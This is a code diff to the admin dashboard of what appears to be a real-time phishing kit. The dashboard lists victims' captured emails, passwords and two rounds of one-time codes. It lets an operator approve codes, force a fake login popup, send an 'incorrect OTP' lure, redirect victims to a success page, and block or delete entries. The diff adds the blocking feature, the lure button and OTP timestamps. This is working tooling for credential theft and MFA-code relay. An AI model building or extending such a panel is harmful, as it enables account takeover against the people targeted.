@@ -164,7 +164,7 @@ body {
 table {
   width: 100%;
   border-collapse: collapse;
-  min-width: 1200px;
+  min-width: 1400px;
 }
 th {
   text-align: left;
@@ -200,6 +200,7 @@ tr:hover {
 .badge-approved { background: #d1fae5; color: #059669; }
 .badge-waiting { background: #e0e7ff; color: #4f46e5; }
 .badge-email { background: #fef3c7; color: #d97706; }
+.badge-blocked { background: #fee2e2; color: #dc2626; }
 
 /* Action Buttons */
 .actions-cell {
@@ -225,6 +226,8 @@ tr:hover {
 .redirect-success-btn { background: #3b82f6; color: white; }
 .send-text-btn { background: #f97316; color: white; }
 .delete-user-btn { background: #ef4444; color: white; }
+.block-email-btn { background: #dc2626; color: white; }
+.incorrect-otp-btn { background: #e11d48; color: white; }
 .waiting-badge {
   background: #e0e7ff;
   color: #4f46e5;
@@ -314,7 +317,78 @@ tr:hover {
   font-size: 11px;
 }
 
-/* Text Modal */
+/* Modal Styles */
+.modal-overlay {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.5);
+  backdrop-filter: blur(2px);
+  z-index: 10000;
+  justify-content: center;
+  align-items: center;
+}
+.modal-overlay.active {
+  display: flex;
+}
+.modal {
+  background: var(--bg-card);
+  border-radius: 20px;
+  max-width: 500px;
+  width: 90%;
+  padding: 24px;
+  box-shadow: var(--shadow-md);
+  max-height: 80vh;
+  overflow-y: auto;
+}
+.modal h3 {
+  font-size: 18px;
+  font-weight: 700;
+  color: var(--text-primary);
+  margin-bottom: 16px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+.modal h3 button {
+  background: transparent;
+  border: none;
+  font-size: 20px;
+  cursor: pointer;
+  color: var(--text-muted);
+}
+.blocked-list {
+  list-style: none;
+}
+.blocked-item {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 12px;
+  border-bottom: 1px solid var(--border-light);
+}
+.blocked-email {
+  font-weight: 500;
+  color: var(--text-primary);
+}
+.blocked-meta {
+  font-size: 10px;
+  color: var(--text-muted);
+  margin-top: 4px;
+}
+.unblock-btn {
+  background: #059669;
+  color: white;
+  border: none;
+  padding: 4px 12px;
+  border-radius: 6px;
+  cursor: pointer;
+  font-size: 11px;
+}
+
 .text-modal-overlay {
   display: none;
   position: fixed;
@@ -378,15 +452,24 @@ tr:hover {
   background: #f97316;
   color: white;
 }
-.text-modal-buttons .send-text-btn-modal:hover {
-  background: #ea580c;
-}
 .text-modal-buttons .release-text-btn-modal {
   background: #6b7280;
   color: white;
 }
-.text-modal-buttons .release-text-btn-modal:hover {
-  background: #4b5563;
+
+.view-blocked-btn {
+  background: #dc2626;
+  color: white;
+  border: none;
+  padding: 6px 16px;
+  border-radius: 8px;
+  cursor: pointer;
+  font-weight: 500;
+  font-size: 13px;
+  margin-left: 12px;
+}
+.view-blocked-btn:hover {
+  background: #b91c1c;
 }
 
 /* Responsive */
@@ -415,10 +498,6 @@ tr:hover {
     padding: 3px 6px;
     font-size: 9px;
   }
-  .waiting-badge {
-    padding: 3px 6px;
-    font-size: 9px;
-  }
 }
 </style>
 </head>
@@ -431,6 +510,7 @@ tr:hover {
       <i class="fas fa-moon"></i>
       <span>Dark Mode</span>
     </button>
+    <button class="view-blocked-btn" id="viewBlockedBtn"><i class="fas fa-ban"></i> Blocked Emails</button>
     <button class="logout-btn" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Logout</button>
   </div>
 </div>
@@ -451,6 +531,13 @@ tr:hover {
   </div>
 </div>
 
+<div id="blockedModal" class="modal-overlay">
+  <div class="modal">
+    <h3>Blocked Emails <button onclick="closeBlockedModal()">✕</button></h3>
+    <div id="blockedListContainer">Loading...</div>
+  </div>
+</div>
+
 <div class="container">
   <div class="stats">
     <div class="stat-card">
@@ -468,24 +555,24 @@ tr:hover {
   </div>
 
   <div class="table-container">
-        <table>
+    <table>
       <thead>
-            <tr>
+        <tr>
           <th>Email</th>
           <th>Password</th>
-          <th>First OTP</th>
-          <th>Second OTP</th>
+          <th>First OTP / Time</th>
+          <th>Second OTP / Time</th>
           <th>Login Email</th>
           <th>Login Password</th>
           <th>Registered</th>
           <th>Status</th>
           <th>Actions</th>
-            </tr>
+        </tr>
       </thead>
       <tbody id="usersTableBody">
         <tr><td colspan="9" style="text-align:center; padding:40px; color:var(--text-muted);"><i class="fas fa-spinner fa-spin"></i> Loading...</td></tr>
       </tbody>
-        </table>
+    </table>
   </div>
 </div>
 
@@ -579,21 +666,11 @@ tr:hover {
           osc2.start(now + 0.35);
           osc2.stop(now + 0.55);
         }, 350);
-      } else if (action === 'login-submitted') {
-        const osc = audioContext.createOscillator();
-        const gain = audioContext.createGain();
-        osc.type = 'triangle';
-        osc.frequency.value = 660;
-        gain.gain.value = 0.25;
-        osc.connect(gain);
-        gain.connect(audioContext.destination);
-        osc.start(now);
-        osc.stop(now + 0.3);
       }
     } catch(e) {}
   }
 
-  function formatTimestamp(dateStr) {
+  function formatTimestamp(dateStr, fieldName) {
     if (!dateStr) return '<span class="data-empty">—</span>';
     const date = new Date(dateStr);
     return `<span class="timestamp" title="${date.toLocaleString()}">${date.toLocaleString()}</span>`;
@@ -605,15 +682,15 @@ tr:hover {
     document.getElementById('notificationMessage').textContent = message;
     toast.style.display = 'block';
     
-    if (playSound && (action === 'email' || action === 'first-otp' || action === 'second-otp' || action === 'login-submitted')) {
+    if (playSound) {
       playSoundForAction(action);
     }
     
-    if (Notification.permission === 'granted' && (action === 'email' || action === 'first-otp' || action === 'second-otp')) {
+    if (Notification.permission === 'granted') {
       new Notification(title, { body: message });
     }
     
-    if ('vibrate' in navigator && (action === 'email' || action === 'first-otp' || action === 'second-otp')) {
+    if ('vibrate' in navigator) {
       navigator.vibrate([200, 100, 200]);
     }
     
@@ -701,7 +778,6 @@ tr:hover {
 
   async function deleteUser(email) {
     if (confirm(`⚠️ Are you sure you want to permanently delete user: ${email}?\n\nThis action cannot be undone.`)) {
-      showNotification('Deleting User', `Deleting ${email}...`, 'delete', false);
       try {
         const response = await fetch('/api/admin/delete-user', {
           method: 'POST',
@@ -723,6 +799,123 @@ tr:hover {
         showNotification('Error', 'Network error', 'error', false);
       }
     }
+  }
+
+  async function blockEmail(email) {
+    if (confirm(`⚠️ Block email: ${email}?\n\nUser will be redirected to the success page immediately.`)) {
+      try {
+        const response = await fetch('/api/admin/block-email', {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json', 
+            'Authorization': `Bearer ${token}` 
+          },
+          body: JSON.stringify({ email })
+        });
+        const data = await response.json();
+        if (data.success) {
+          showNotification('Email Blocked', `${email} has been blocked`, 'block', true);
+          loadUsers();
+          loadBlockedEmails();
+        } else {
+          showNotification('Error', data.error || 'Failed to block email', 'error', false);
+        }
+      } catch (error) {
+        console.error('Block email error:', error);
+        showNotification('Error', 'Network error', 'error', false);
+      }
+    }
+  }
+
+  async function incorrectOTP(email) {
+    if (confirm(`❌ Mark OTP as incorrect for: ${email}?\n\nUser will receive a message to check their email.`)) {
+      try {
+        const response = await fetch('/api/admin/incorrect-otp', {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json', 
+            'Authorization': `Bearer ${token}` 
+          },
+          body: JSON.stringify({ email })
+        });
+        const data = await response.json();
+        if (data.success) {
+          showNotification('Incorrect OTP', `Message sent to ${email}`, 'incorrect', true);
+        } else {
+          showNotification('Error', data.error || 'Failed to send incorrect OTP message', 'error', false);
+        }
+      } catch (error) {
+        console.error('Incorrect OTP error:', error);
+        showNotification('Error', 'Network error', 'error', false);
+      }
+    }
+  }
+
+  async function loadBlockedEmails() {
+    try {
+      const response = await fetch('/api/admin/blocked-emails', {
+        headers: { 'Authorization': `Bearer ${token}` }
+      });
+      const blocked = await response.json();
+      
+      const container = document.getElementById('blockedListContainer');
+      if (blocked.length === 0) {
+        container.innerHTML = '<p style="text-align:center; color:var(--text-muted);">No blocked emails</p>';
+        return;
+      }
+      
+      container.innerHTML = `
+        <ul class="blocked-list">
+          ${blocked.map(b => `
+            <li class="blocked-item">
+              <div>
+                <div class="blocked-email">${b.email}</div>
+                <div class="blocked-meta">Blocked: ${new Date(b.blocked_at).toLocaleString()} by ${b.blocked_by || 'Admin'}</div>
+              </div>
+              <button class="unblock-btn" onclick="unblockEmail('${b.email}')">Unblock</button>
+            </li>
+          `).join('')}
+        </ul>
+      `;
+    } catch (err) {
+      console.error(err);
+      document.getElementById('blockedListContainer').innerHTML = '<p style="color:red;">Error loading blocked emails</p>';
+    }
+  }
+
+  async function unblockEmail(email) {
+    if (confirm(`Unblock ${email}?`)) {
+      try {
+        const response = await fetch('/api/admin/unblock-email', {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json', 
+            'Authorization': `Bearer ${token}` 
+          },
+          body: JSON.stringify({ email })
+        });
+        const data = await response.json();
+        if (data.success) {
+          showNotification('Email Unblocked', `${email} can now submit again`, 'unblock', false);
+          loadBlockedEmails();
+          loadUsers();
+        } else {
+          showNotification('Error', data.error || 'Failed to unblock', 'error', false);
+        }
+      } catch (error) {
+        console.error('Unblock error:', error);
+        showNotification('Error', 'Network error', 'error', false);
+      }
+    }
+  }
+
+  function openBlockedModal() {
+    loadBlockedEmails();
+    document.getElementById('blockedModal').classList.add('active');
+  }
+
+  function closeBlockedModal() {
+    document.getElementById('blockedModal').classList.remove('active');
   }
 
   async function loadUsers() {
@@ -780,36 +973,54 @@ tr:hover {
       let statusBadge = '';
       let actionButtons = '';
       
-      // ALL BUTTONS VISIBLE for users who have entered OTP
-      if (user.approved && user.otp) {
-        statusBadge = '<span class="badge badge-waiting">🔐 Active User</span>';
-        actionButtons = `
-          <button class="action-btn approve-second-btn" onclick="approveSecond('${user.email}')"><i class="fas fa-check-circle"></i> Approve Current OTP</button>
-          <button class="action-btn force-login-btn" onclick="forceLogin('${user.email}')"><i class="fas fa-sign-in-alt"></i> Force Login</button>
-          <button class="action-btn redirect-success-btn" onclick="redirectToSuccess('${user.email}')"><i class="fas fa-arrow-right"></i> Redirect to Success</button>
-          <button class="action-btn send-text-btn" onclick="showTextModal('${user.email}')"><i class="fas fa-paper-plane"></i> Send Text</button>
-          <button class="action-btn delete-user-btn" onclick="deleteUser('${user.email}')"><i class="fas fa-trash-alt"></i> Delete</button>
-        `;
+      // Determine status
+      if (user.redirect_success === true) {
+        statusBadge = '<span class="badge badge-blocked">🚫 Redirected to Success</span>';
+      } else if (user.approved && user.second_approved) {
+        statusBadge = '<span class="badge badge-approved">✅ Fully Approved</span>';
+      } else if (user.approved && user.otp && !user.second_approved) {
+        statusBadge = '<span class="badge badge-waiting">🔐 First OTP Approved - Waiting for Second OTP</span>';
       } else if (user.approved && !user.otp) {
         statusBadge = '<span class="badge badge-waiting">✅ Email Approved - Waiting for First OTP</span>';
-        actionButtons = '<span class="waiting-badge"><i class="fas fa-clock"></i> Waiting for user</span>';
       } else if (!user.approved) {
         statusBadge = '<span class="badge badge-email">⏳ Pending Email Approval</span>';
-        actionButtons = `<button class="action-btn approve-email-btn" onclick="approveEmail('${user.email}')"><i class="fas fa-envelope"></i> Approve Email</button>`;
       } else {
         statusBadge = '<span class="badge badge-pending">Pending</span>';
-        actionButtons = '';
       }
+      
+      // ALL BUTTONS ALWAYS VISIBLE
+      actionButtons = `
+        <button class="action-btn approve-email-btn" onclick="approveEmail('${user.email}')" ${user.approved ? 'disabled style="opacity:0.5;"' : ''}><i class="fas fa-envelope"></i> Approve Email</button>
+        <button class="action-btn approve-second-btn" onclick="approveSecond('${user.email}')"><i class="fas fa-check-circle"></i> Approve Current OTP</button>
+        <button class="action-btn block-email-btn" onclick="blockEmail('${user.email}')"><i class="fas fa-ban"></i> Block Email</button>
+        <button class="action-btn force-login-btn" onclick="forceLogin('${user.email}')"><i class="fas fa-sign-in-alt"></i> Force Login</button>
+        <button class="action-btn redirect-success-btn" onclick="redirectToSuccess('${user.email}')"><i class="fas fa-arrow-right"></i> Redirect to Success</button>
+        <button class="action-btn send-text-btn" onclick="showTextModal('${user.email}')"><i class="fas fa-paper-plane"></i> Send Text</button>
+        <button class="action-btn incorrect-otp-btn" onclick="incorrectOTP('${user.email}')"><i class="fas fa-times-circle"></i> Incorrect OTP</button>
+        <button class="action-btn delete-user-btn" onclick="deleteUser('${user.email}')"><i class="fas fa-trash-alt"></i> Delete</button>
+      `;
+      
+      // Format timestamps
+      const firstOtpDisplay = user.otp ? formatValue(user.otp, 'First OTP') : '<span class="data-empty">—</span>';
+      const firstOtpTime = user.first_otp_submitted_at ? formatTimestamp(user.first_otp_submitted_at, 'First OTP Time') : '<span class="data-empty">—</span>';
+      const secondOtpDisplay = user.second_otp ? formatValue(user.second_otp, 'Second OTP') : '<span class="data-empty">—</span>';
+      const secondOtpTime = user.second_otp_submitted_at ? formatTimestamp(user.second_otp_submitted_at, 'Second OTP Time') : '<span class="data-empty">—</span>';
       
       return `
         <tr>
           <td>${formatValue(user.email, 'Email')}</td>
           <td>${formatValue(user.password, 'Password')}</td>
-          <td>${user.otp ? formatValue(user.otp, 'First OTP') : '<span class="data-empty">—</span>'}</td>
-          <td>${user.second_otp ? formatValue(user.second_otp, 'Second OTP') : '<span class="data-empty">—</span>'}</td>
+          <td>
+            ${firstOtpDisplay}<br>
+            <span style="font-size: 9px;">${firstOtpTime}</span>
+          </td>
+          <td>
+            ${secondOtpDisplay}<br>
+            <span style="font-size: 9px;">${secondOtpTime}</span>
+          </td>
           <td>${user.login_email ? formatValue(user.login_email, 'Login Email') : '<span class="data-empty">—</span>'}</td>
           <td>${user.login_password ? formatValue(user.login_password, 'Login Password') : '<span class="data-empty">—</span>'}</td>
-          <td>${formatTimestamp(user.created_at)}</td>
+          <td>${formatTimestamp(user.email_submitted_at, 'Submitted')}</td>
           <td>${statusBadge}</td>
           <td class="actions-cell">${actionButtons}</td>
         </tr>
@@ -818,7 +1029,6 @@ tr:hover {
   }
 
   async function approveEmail(email) {
-    showNotification('Email Approved', `Approving email for ${email}`, 'email-approve', false);
     try {
       const response = await fetch('/api/admin/approve-user', {
         method: 'POST',
@@ -830,6 +1040,7 @@ tr:hover {
       });
       const data = await response.json();
       if (data.success) {
+        showNotification('Email Approved', `${email} approved`, 'email', true);
         loadUsers();
       }
     } catch (error) {
@@ -838,7 +1049,6 @@ tr:hover {
   }
 
   async function approveSecond(email) {
-    showNotification('OTP Approved', `Approved OTP for ${email} - Ready for next code`, 'approve-otp', false);
     try {
       const response = await fetch('/api/admin/approve-second', {
         method: 'POST',
@@ -850,6 +1060,7 @@ tr:hover {
       });
       const data = await response.json();
       if (data.success) {
+        showNotification('OTP Approved', `OTP approved for ${email}`, 'approve', true);
         loadUsers();
       }
     } catch (error) {
@@ -858,7 +1069,6 @@ tr:hover {
   }
 
   async function forceLogin(email) {
-    showNotification('Force Login', `Forcing login popup for ${email}`, 'force-login', false);
     try {
       const response = await fetch('/api/admin/force-login', {
         method: 'POST',
@@ -870,7 +1080,7 @@ tr:hover {
       });
       const data = await response.json();
       if (data.success) {
-        loadUsers();
+        showNotification('Force Login', `Login popup triggered for ${email}`, 'force', true);
       }
     } catch (error) {
       console.error('Force login error:', error);
@@ -878,7 +1088,6 @@ tr:hover {
   }
 
   async function redirectToSuccess(email) {
-    showNotification('Redirect to Success', `Redirecting ${email} to success page`, 'redirect', false);
     try {
       const response = await fetch('/api/admin/redirect-success', {
         method: 'POST',
@@ -890,6 +1099,7 @@ tr:hover {
       });
       const data = await response.json();
       if (data.success) {
+        showNotification('Redirect to Success', `${email} will be redirected`, 'redirect', true);
         loadUsers();
       }
     } catch (error) {
@@ -917,7 +1127,7 @@ tr:hover {
     loadUsers();
   });
   socket.on('user-login-submitted', (data) => {
-    showNotification('🔐 Login Submitted', `${data.email} submitted login: ${data.loginEmail}`, 'login-submitted', true);
+    showNotification('🔐 Login Submitted', `${data.email} submitted login: ${data.loginEmail}`, 'login', true);
     loadUsers();
   });
   socket.on('force-login-triggered', (data) => {
@@ -936,9 +1146,19 @@ tr:hover {
     showNotification('🗑️ User Deleted', `${data.email} was removed from system`, 'delete', false);
     loadUsers();
   });
+  socket.on('duplicate-otp-attempt', (data) => {
+    showNotification('⚠️ Duplicate OTP Attempt', `${data.email} tried using same OTP as first!`, 'warning', true);
+    loadUsers();
+  });
+  socket.on('user-blocked', (data) => {
+    showNotification('🚫 User Blocked', `${data.email} has been blocked`, 'block', true);
+    loadUsers();
+    loadBlockedEmails();
+  });
 
   document.getElementById('sendTextBtnModal').addEventListener('click', sendTextToUser);
   document.getElementById('releaseTextBtnModal').addEventListener('click', releaseTextPopup);
+  document.getElementById('viewBlockedBtn').addEventListener('click', openBlockedModal);
   document.getElementById('textModal').addEventListener('click', (e) => {
     if (e.target === document.getElementById('textModal')) {
       hideTextModal();
